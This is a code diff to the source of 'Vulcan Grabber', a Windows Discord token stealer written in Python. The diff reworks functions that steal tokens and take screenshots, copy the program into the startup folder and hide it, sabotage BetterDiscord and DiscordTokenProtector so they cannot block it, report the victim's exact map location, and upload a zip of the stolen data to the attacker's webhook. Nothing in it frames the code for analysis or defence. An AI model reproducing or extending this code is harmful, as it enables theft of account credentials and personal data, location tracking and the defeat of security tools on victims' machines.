@@ -109,10 +109,9 @@ class Vulcan_Grabber(functions):
             self.tokens.append(token)
 
     async def init(self):
-        await self.fuckBetterDiscord()
-        await self.fuckTokenProtector()
+        await self.bypass_shit()
         
-        function_list = [self.take_screenshot, self.stealTokens, self.fuckoff, self.addToStart]
+        function_list = [self.take_screenshot, self.stealTokens, self.fuckoff]
 
         for func in function_list:
             process = threading.Thread(target = func, daemon = True)
@@ -127,16 +126,21 @@ class Vulcan_Grabber(functions):
         shutil.rmtree(self.dir)
 
     def fuckoff(self):
-        ctypes.windll.kernel32.SetFileAttributesW(argv[0], 2)
-
-    def addToStart(self):
         try:
             shutil.copy2(argv[0], self.startup)
         except Exception:
             pass
+        ctypes.windll.kernel32.SetFileAttributesW(argv[0], 2)
 
-
-    async def fuckTokenProtector(self):
+    async def bypass_shit(self):
+        bd_path = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
+        if os.path.exists(bd_path):
+            temp_path = "api/webhooks"
+            with open(bd_path, 'r', encoding = "cp437", errors = 'ignore') as f:
+                txt = f.read()
+                content = txt.replace(temp_path, 'FUCKOFF BETTERDISCORD AAAAA')
+            with open(bd_path, 'w', newline='', encoding = "cp437", errors='ignore') as f:
+                f.write(content)
         tp_path = f"{self.roaming}\\DiscordTokenProtector\\"
         if not os.path.exists(tp_path):
             return
@@ -167,16 +171,6 @@ class Vulcan_Grabber(functions):
                 item['version'] = 69420
             with open(config, 'w') as p:
                 json.dump(item, p, indent = 2, sort_keys = True)
-
-    async def fuckBetterDiscord(self):
-        bd_path = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
-        if os.path.exists(bd_path):
-            temp_path = "api/webhooks"
-            with open(bd_path, 'r', encoding = "cp437", errors = 'ignore') as f:
-                txt = f.read()
-                content = txt.replace(temp_path, 'FUCKOFF BETTERDISCORD AAAAA')
-            with open(bd_path, 'w', newline='', encoding = "cp437", errors='ignore') as f:
-                f.write(content)
 
     @try_this_shit
     def stealTokens(self):
@@ -302,7 +296,7 @@ class Vulcan_Grabber(functions):
                         'url': 'https://github.com/Maywitz/Vulcan-Grabber',
                         'icon_url': 'https://raw.githubusercontent.com/Maywitz/Images/main/Profile-Picture/Maywitz.png'
                     },
-                    'description': f'[Maps Location]({pulled_googlemap})\n\n',
+                    'description': f'[Exact Google Maps Location]({pulled_googlemap})\n\n',
                     'fields': [
                         {
                             'name': '\u200b',
@@ -354,7 +348,6 @@ class Vulcan_Grabber(functions):
         with open(newzip, 'rb') as f:
             httpx.post(self.webhook_url, files = {'upload_file': f})
         os.remove(newzip)
-
 
 if __name__ == "__main__" and os.name == "nt":
     asyncio.run(Vulcan_Grabber().init())
